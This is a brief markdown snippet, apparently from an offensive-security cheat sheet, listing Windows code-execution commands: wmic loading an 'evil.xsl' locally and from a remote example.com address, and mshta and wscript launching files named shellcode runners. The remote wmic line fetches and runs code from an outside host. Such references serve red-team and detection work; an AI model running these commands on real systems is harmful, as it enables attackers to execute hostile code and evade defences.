## Execution

```cmd
# XSL
wmic process list /FORMAT:evil.xsl
wmic os get /FORMAT:"https://example.com/evil.xsl"

# HTA
mshta c:\users\public\shellcode_runner.hta

# JS
wscript c:\users\public\shellcode_runner.js
```
